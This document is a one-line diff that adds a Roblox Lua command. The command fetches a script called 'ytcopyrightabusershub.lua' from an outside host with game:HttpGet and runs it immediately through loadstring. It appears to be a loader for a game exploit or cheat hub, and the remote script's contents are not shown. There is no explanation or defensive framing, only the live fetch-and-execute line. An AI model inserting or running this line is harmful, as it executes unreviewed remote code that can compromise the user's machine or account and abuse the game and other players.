@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://scripts.luawl.com/17307/ytcopyrightabusershub.lua'))()
